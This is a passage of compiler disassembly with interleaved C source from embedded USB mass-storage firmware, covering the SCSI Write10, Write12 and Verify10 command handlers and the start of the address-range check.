 800a72a:	2b00      	cmp	r3, #0
 800a72c:	da0b      	bge.n	800a746 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a72e:	697b      	ldr	r3, [r7, #20]
 800a730:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a734:	7f59      	ldrb	r1, [r3, #29]
 800a736:	2320      	movs	r3, #32
 800a738:	2205      	movs	r2, #5
 800a73a:	68f8      	ldr	r0, [r7, #12]
 800a73c:	f7ff fd62 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a740:	f04f 33ff 	mov.w	r3, #4294967295
 800a744:	e09d      	b.n	800a882 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a746:	68fb      	ldr	r3, [r7, #12]
 800a748:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a74c:	68fa      	ldr	r2, [r7, #12]
 800a74e:	33b0      	adds	r3, #176	; 0xb0
 800a750:	009b      	lsls	r3, r3, #2
 800a752:	4413      	add	r3, r2
 800a754:	685b      	ldr	r3, [r3, #4]
 800a756:	689b      	ldr	r3, [r3, #8]
 800a758:	7afa      	ldrb	r2, [r7, #11]
 800a75a:	4610      	mov	r0, r2
 800a75c:	4798      	blx	r3
 800a75e:	4603      	mov	r3, r0
 800a760:	2b00      	cmp	r3, #0
 800a762:	d008      	beq.n	800a776 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a764:	7af9      	ldrb	r1, [r7, #11]
 800a766:	233a      	movs	r3, #58	; 0x3a
 800a768:	2202      	movs	r2, #2
 800a76a:	68f8      	ldr	r0, [r7, #12]
 800a76c:	f7ff fd4a 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a770:	f04f 33ff 	mov.w	r3, #4294967295
 800a774:	e085      	b.n	800a882 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a776:	68fb      	ldr	r3, [r7, #12]
 800a778:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a77c:	68fa      	ldr	r2, [r7, #12]
 800a77e:	33b0      	adds	r3, #176	; 0xb0
 800a780:	009b      	lsls	r3, r3, #2
 800a782:	4413      	add	r3, r2
 800a784:	685b      	ldr	r3, [r3, #4]
 800a786:	68db      	ldr	r3, [r3, #12]
 800a788:	7afa      	ldrb	r2, [r7, #11]
 800a78a:	4610      	mov	r0, r2
 800a78c:	4798      	blx	r3
 800a78e:	4603      	mov	r3, r0
 800a790:	2b00      	cmp	r3, #0
 800a792:	d008      	beq.n	800a7a6 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a794:	7af9      	ldrb	r1, [r7, #11]
 800a796:	2327      	movs	r3, #39	; 0x27
 800a798:	2202      	movs	r2, #2
 800a79a:	68f8      	ldr	r0, [r7, #12]
 800a79c:	f7ff fd32 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a7a0:	f04f 33ff 	mov.w	r3, #4294967295
 800a7a4:	e06d      	b.n	800a882 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7a6:	687b      	ldr	r3, [r7, #4]
 800a7a8:	3302      	adds	r3, #2
 800a7aa:	781b      	ldrb	r3, [r3, #0]
 800a7ac:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a7ae:	687b      	ldr	r3, [r7, #4]
 800a7b0:	3303      	adds	r3, #3
 800a7b2:	781b      	ldrb	r3, [r3, #0]
 800a7b4:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7b6:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a7b8:	687b      	ldr	r3, [r7, #4]
 800a7ba:	3304      	adds	r3, #4
 800a7bc:	781b      	ldrb	r3, [r3, #0]
 800a7be:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a7c0:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a7c2:	687a      	ldr	r2, [r7, #4]
 800a7c4:	3205      	adds	r2, #5
 800a7c6:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a7c8:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7ca:	697a      	ldr	r2, [r7, #20]
 800a7cc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7d0:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7d2:	687b      	ldr	r3, [r7, #4]
 800a7d4:	3307      	adds	r3, #7
 800a7d6:	781b      	ldrb	r3, [r3, #0]
 800a7d8:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a7da:	687a      	ldr	r2, [r7, #4]
 800a7dc:	3208      	adds	r2, #8
 800a7de:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7e0:	4313      	orrs	r3, r2
 800a7e2:	697a      	ldr	r2, [r7, #20]
 800a7e4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7e8:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a7ea:	697b      	ldr	r3, [r7, #20]
 800a7ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7f0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a7f2:	697b      	ldr	r3, [r7, #20]
 800a7f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7f8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a7fa:	7af9      	ldrb	r1, [r7, #11]
 800a7fc:	68f8      	ldr	r0, [r7, #12]
 800a7fe:	f000 f97a 	bl	800aaf6 <SCSI_CheckAddressRange>
 800a802:	4603      	mov	r3, r0
 800a804:	2b00      	cmp	r3, #0
 800a806:	da02      	bge.n	800a80e <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a808:	f04f 33ff 	mov.w	r3, #4294967295
 800a80c:	e039      	b.n	800a882 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a80e:	697b      	ldr	r3, [r7, #20]
 800a810:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a814:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a816:	697a      	ldr	r2, [r7, #20]
 800a818:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a81c:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a820:	fb02 f303 	mul.w	r3, r2, r3
 800a824:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a826:	697b      	ldr	r3, [r7, #20]
 800a828:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a82c:	699b      	ldr	r3, [r3, #24]
 800a82e:	693a      	ldr	r2, [r7, #16]
 800a830:	429a      	cmp	r2, r3
 800a832:	d00b      	beq.n	800a84c <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a834:	697b      	ldr	r3, [r7, #20]
 800a836:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a83a:	7f59      	ldrb	r1, [r3, #29]
 800a83c:	2320      	movs	r3, #32
 800a83e:	2205      	movs	r2, #5
 800a840:	68f8      	ldr	r0, [r7, #12]
 800a842:	f7ff fcdf 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a846:	f04f 33ff 	mov.w	r3, #4294967295
 800a84a:	e01a      	b.n	800a882 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a84c:	693b      	ldr	r3, [r7, #16]
 800a84e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a852:	bf28      	it	cs
 800a854:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a858:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a85a:	697b      	ldr	r3, [r7, #20]
 800a85c:	2201      	movs	r2, #1
 800a85e:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a860:	4b0a      	ldr	r3, [pc, #40]	; (800a88c <SCSI_Write10+0x1c4>)
 800a862:	7819      	ldrb	r1, [r3, #0]
 800a864:	697b      	ldr	r3, [r7, #20]
 800a866:	f103 0210 	add.w	r2, r3, #16
 800a86a:	693b      	ldr	r3, [r7, #16]
 800a86c:	68f8      	ldr	r0, [r7, #12]
 800a86e:	f002 faf3 	bl	800ce58 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a872:	2300      	movs	r3, #0
 800a874:	e005      	b.n	800a882 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a876:	7afb      	ldrb	r3, [r7, #11]
 800a878:	4619      	mov	r1, r3
 800a87a:	68f8      	ldr	r0, [r7, #12]
 800a87c:	f000 f9fe 	bl	800ac7c <SCSI_ProcessWrite>
 800a880:	4603      	mov	r3, r0
}
 800a882:	4618      	mov	r0, r3
 800a884:	3718      	adds	r7, #24
 800a886:	46bd      	mov	sp, r7
 800a888:	bd80      	pop	{r7, pc}
 800a88a:	bf00      	nop
 800a88c:	2000010b 	.word	0x2000010b

0800a890 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a890:	b580      	push	{r7, lr}
 800a892:	b086      	sub	sp, #24
 800a894:	af00      	add	r7, sp, #0
 800a896:	60f8      	str	r0, [r7, #12]
 800a898:	460b      	mov	r3, r1
 800a89a:	607a      	str	r2, [r7, #4]
 800a89c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a89e:	68fb      	ldr	r3, [r7, #12]
 800a8a0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a8a4:	68fb      	ldr	r3, [r7, #12]
 800a8a6:	32b0      	adds	r2, #176	; 0xb0
 800a8a8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a8ac:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a8ae:	697b      	ldr	r3, [r7, #20]
 800a8b0:	2b00      	cmp	r3, #0
 800a8b2:	d102      	bne.n	800a8ba <SCSI_Write12+0x2a>
  {
    return -1;
 800a8b4:	f04f 33ff 	mov.w	r3, #4294967295
 800a8b8:	e0d7      	b.n	800aa6a <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a8ba:	697b      	ldr	r3, [r7, #20]
 800a8bc:	7a1b      	ldrb	r3, [r3, #8]
 800a8be:	2b00      	cmp	r3, #0
 800a8c0:	f040 80cd 	bne.w	800aa5e <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a8c4:	697b      	ldr	r3, [r7, #20]
 800a8c6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8ca:	699b      	ldr	r3, [r3, #24]
 800a8cc:	2b00      	cmp	r3, #0
 800a8ce:	d10b      	bne.n	800a8e8 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8d0:	697b      	ldr	r3, [r7, #20]
 800a8d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8d6:	7f59      	ldrb	r1, [r3, #29]
 800a8d8:	2320      	movs	r3, #32
 800a8da:	2205      	movs	r2, #5
 800a8dc:	68f8      	ldr	r0, [r7, #12]
 800a8de:	f7ff fc91 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a8e2:	f04f 33ff 	mov.w	r3, #4294967295
 800a8e6:	e0c0      	b.n	800aa6a <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a8e8:	697b      	ldr	r3, [r7, #20]
 800a8ea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8ee:	7f1b      	ldrb	r3, [r3, #28]
 800a8f0:	b25b      	sxtb	r3, r3
 800a8f2:	2b00      	cmp	r3, #0
 800a8f4:	da0b      	bge.n	800a90e <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8f6:	697b      	ldr	r3, [r7, #20]
 800a8f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8fc:	7f59      	ldrb	r1, [r3, #29]
 800a8fe:	2320      	movs	r3, #32
 800a900:	2205      	movs	r2, #5
 800a902:	68f8      	ldr	r0, [r7, #12]
 800a904:	f7ff fc7e 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a908:	f04f 33ff 	mov.w	r3, #4294967295
 800a90c:	e0ad      	b.n	800aa6a <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a90e:	68fb      	ldr	r3, [r7, #12]
 800a910:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a914:	68fa      	ldr	r2, [r7, #12]
 800a916:	33b0      	adds	r3, #176	; 0xb0
 800a918:	009b      	lsls	r3, r3, #2
 800a91a:	4413      	add	r3, r2
 800a91c:	685b      	ldr	r3, [r3, #4]
 800a91e:	689b      	ldr	r3, [r3, #8]
 800a920:	7afa      	ldrb	r2, [r7, #11]
 800a922:	4610      	mov	r0, r2
 800a924:	4798      	blx	r3
 800a926:	4603      	mov	r3, r0
 800a928:	2b00      	cmp	r3, #0
 800a92a:	d00b      	beq.n	800a944 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a92c:	7af9      	ldrb	r1, [r7, #11]
 800a92e:	233a      	movs	r3, #58	; 0x3a
 800a930:	2202      	movs	r2, #2
 800a932:	68f8      	ldr	r0, [r7, #12]
 800a934:	f7ff fc66 	bl	800a204 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a938:	697b      	ldr	r3, [r7, #20]
 800a93a:	2205      	movs	r2, #5
 800a93c:	721a      	strb	r2, [r3, #8]
      return -1;
 800a93e:	f04f 33ff 	mov.w	r3, #4294967295
 800a942:	e092      	b.n	800aa6a <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a944:	68fb      	ldr	r3, [r7, #12]
 800a946:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a94a:	68fa      	ldr	r2, [r7, #12]
 800a94c:	33b0      	adds	r3, #176	; 0xb0
 800a94e:	009b      	lsls	r3, r3, #2
 800a950:	4413      	add	r3, r2
 800a952:	685b      	ldr	r3, [r3, #4]
 800a954:	68db      	ldr	r3, [r3, #12]
 800a956:	7afa      	ldrb	r2, [r7, #11]
 800a958:	4610      	mov	r0, r2
 800a95a:	4798      	blx	r3
 800a95c:	4603      	mov	r3, r0
 800a95e:	2b00      	cmp	r3, #0
 800a960:	d00b      	beq.n	800a97a <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a962:	7af9      	ldrb	r1, [r7, #11]
 800a964:	2327      	movs	r3, #39	; 0x27
 800a966:	2202      	movs	r2, #2
 800a968:	68f8      	ldr	r0, [r7, #12]
 800a96a:	f7ff fc4b 	bl	800a204 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a96e:	697b      	ldr	r3, [r7, #20]
 800a970:	2205      	movs	r2, #5
 800a972:	721a      	strb	r2, [r3, #8]
      return -1;
 800a974:	f04f 33ff 	mov.w	r3, #4294967295
 800a978:	e077      	b.n	800aa6a <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a97a:	687b      	ldr	r3, [r7, #4]
 800a97c:	3302      	adds	r3, #2
 800a97e:	781b      	ldrb	r3, [r3, #0]
 800a980:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a982:	687b      	ldr	r3, [r7, #4]
 800a984:	3303      	adds	r3, #3
 800a986:	781b      	ldrb	r3, [r3, #0]
 800a988:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a98a:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a98c:	687b      	ldr	r3, [r7, #4]
 800a98e:	3304      	adds	r3, #4
 800a990:	781b      	ldrb	r3, [r3, #0]
 800a992:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a994:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a996:	687a      	ldr	r2, [r7, #4]
 800a998:	3205      	adds	r2, #5
 800a99a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a99c:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a99e:	697a      	ldr	r2, [r7, #20]
 800a9a0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9a4:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9a6:	687b      	ldr	r3, [r7, #4]
 800a9a8:	3306      	adds	r3, #6
 800a9aa:	781b      	ldrb	r3, [r3, #0]
 800a9ac:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a9ae:	687b      	ldr	r3, [r7, #4]
 800a9b0:	3307      	adds	r3, #7
 800a9b2:	781b      	ldrb	r3, [r3, #0]
 800a9b4:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9b6:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a9b8:	687b      	ldr	r3, [r7, #4]
 800a9ba:	3308      	adds	r3, #8
 800a9bc:	781b      	ldrb	r3, [r3, #0]
 800a9be:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a9c0:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a9c2:	687a      	ldr	r2, [r7, #4]
 800a9c4:	3209      	adds	r2, #9
 800a9c6:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a9c8:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9ca:	697a      	ldr	r2, [r7, #20]
 800a9cc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9d0:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a9d2:	697b      	ldr	r3, [r7, #20]
 800a9d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9d8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a9da:	697b      	ldr	r3, [r7, #20]
 800a9dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9e0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9e2:	7af9      	ldrb	r1, [r7, #11]
 800a9e4:	68f8      	ldr	r0, [r7, #12]
 800a9e6:	f000 f886 	bl	800aaf6 <SCSI_CheckAddressRange>
 800a9ea:	4603      	mov	r3, r0
 800a9ec:	2b00      	cmp	r3, #0
 800a9ee:	da02      	bge.n	800a9f6 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a9f0:	f04f 33ff 	mov.w	r3, #4294967295
 800a9f4:	e039      	b.n	800aa6a <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a9f6:	697b      	ldr	r3, [r7, #20]
 800a9f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9fc:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9fe:	697a      	ldr	r2, [r7, #20]
 800aa00:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa04:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa08:	fb02 f303 	mul.w	r3, r2, r3
 800aa0c:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa0e:	697b      	ldr	r3, [r7, #20]
 800aa10:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa14:	699b      	ldr	r3, [r3, #24]
 800aa16:	693a      	ldr	r2, [r7, #16]
 800aa18:	429a      	cmp	r2, r3
 800aa1a:	d00b      	beq.n	800aa34 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa1c:	697b      	ldr	r3, [r7, #20]
 800aa1e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa22:	7f59      	ldrb	r1, [r3, #29]
 800aa24:	2320      	movs	r3, #32
 800aa26:	2205      	movs	r2, #5
 800aa28:	68f8      	ldr	r0, [r7, #12]
 800aa2a:	f7ff fbeb 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800aa2e:	f04f 33ff 	mov.w	r3, #4294967295
 800aa32:	e01a      	b.n	800aa6a <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aa34:	693b      	ldr	r3, [r7, #16]
 800aa36:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aa3a:	bf28      	it	cs
 800aa3c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aa40:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aa42:	697b      	ldr	r3, [r7, #20]
 800aa44:	2201      	movs	r2, #1
 800aa46:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aa48:	4b0a      	ldr	r3, [pc, #40]	; (800aa74 <SCSI_Write12+0x1e4>)
 800aa4a:	7819      	ldrb	r1, [r3, #0]
 800aa4c:	697b      	ldr	r3, [r7, #20]
 800aa4e:	f103 0210 	add.w	r2, r3, #16
 800aa52:	693b      	ldr	r3, [r7, #16]
 800aa54:	68f8      	ldr	r0, [r7, #12]
 800aa56:	f002 f9ff 	bl	800ce58 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aa5a:	2300      	movs	r3, #0
 800aa5c:	e005      	b.n	800aa6a <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800aa5e:	7afb      	ldrb	r3, [r7, #11]
 800aa60:	4619      	mov	r1, r3
 800aa62:	68f8      	ldr	r0, [r7, #12]
 800aa64:	f000 f90a 	bl	800ac7c <SCSI_ProcessWrite>
 800aa68:	4603      	mov	r3, r0
}
 800aa6a:	4618      	mov	r0, r3
 800aa6c:	3718      	adds	r7, #24
 800aa6e:	46bd      	mov	sp, r7
 800aa70:	bd80      	pop	{r7, pc}
 800aa72:	bf00      	nop
 800aa74:	2000010b 	.word	0x2000010b

0800aa78 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aa78:	b580      	push	{r7, lr}
 800aa7a:	b086      	sub	sp, #24
 800aa7c:	af00      	add	r7, sp, #0
 800aa7e:	60f8      	str	r0, [r7, #12]
 800aa80:	460b      	mov	r3, r1
 800aa82:	607a      	str	r2, [r7, #4]
 800aa84:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aa86:	68fb      	ldr	r3, [r7, #12]
 800aa88:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aa8c:	68fb      	ldr	r3, [r7, #12]
 800aa8e:	32b0      	adds	r2, #176	; 0xb0
 800aa90:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aa94:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800aa96:	697b      	ldr	r3, [r7, #20]
 800aa98:	2b00      	cmp	r3, #0
 800aa9a:	d102      	bne.n	800aaa2 <SCSI_Verify10+0x2a>
  {
    return -1;
 800aa9c:	f04f 33ff 	mov.w	r3, #4294967295
 800aaa0:	e025      	b.n	800aaee <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800aaa2:	687b      	ldr	r3, [r7, #4]
 800aaa4:	3301      	adds	r3, #1
 800aaa6:	781b      	ldrb	r3, [r3, #0]
 800aaa8:	f003 0302 	and.w	r3, r3, #2
 800aaac:	2b00      	cmp	r3, #0
 800aaae:	d008      	beq.n	800aac2 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800aab0:	7af9      	ldrb	r1, [r7, #11]
 800aab2:	2324      	movs	r3, #36	; 0x24
 800aab4:	2205      	movs	r2, #5
 800aab6:	68f8      	ldr	r0, [r7, #12]
 800aab8:	f7ff fba4 	bl	800a204 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800aabc:	f04f 33ff 	mov.w	r3, #4294967295
 800aac0:	e015      	b.n	800aaee <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800aac2:	697b      	ldr	r3, [r7, #20]
 800aac4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aac8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aaca:	697b      	ldr	r3, [r7, #20]
 800aacc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aad0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aad2:	7af9      	ldrb	r1, [r7, #11]
 800aad4:	68f8      	ldr	r0, [r7, #12]
 800aad6:	f000 f80e 	bl	800aaf6 <SCSI_CheckAddressRange>
 800aada:	4603      	mov	r3, r0
 800aadc:	2b00      	cmp	r3, #0
 800aade:	da02      	bge.n	800aae6 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800aae0:	f04f 33ff 	mov.w	r3, #4294967295
 800aae4:	e003      	b.n	800aaee <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800aae6:	697b      	ldr	r3, [r7, #20]
 800aae8:	2200      	movs	r2, #0
 800aaea:	60da      	str	r2, [r3, #12]

  return 0;
 800aaec:	2300      	movs	r3, #0
}
 800aaee:	4618      	mov	r0, r3
 800aaf0:	3718      	adds	r7, #24
 800aaf2:	46bd      	mov	sp, r7
 800aaf4:	bd80      	pop	{r7, pc}

0800aaf6 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800aaf6:	b580      	push	{r7, lr}
 800aaf8:	b086      	sub	sp, #24
 800aafa:	af00      	add	r7, sp, #0
 800aafc:	60f8      	str	r0, [r7, #12]
 800aafe:	607a      	str	r2, [r7, #4]
 800ab00:	603b      	str	r3, [r7, #0]
 800ab02:	460b      	mov	r3, r1
 800ab04:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab06:	68fb      	ldr	r3, [r7, #12]
 800ab08:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab0c:	68fb      	ldr	r3, [r7, #12]
 800ab0e:	32b0      	adds	r2, #176	; 0xb0
 800ab10:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab14:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab16:	697b      	ldr	r3, [r7, #20]
 800ab18:	2b00      	cmp	r3, #0
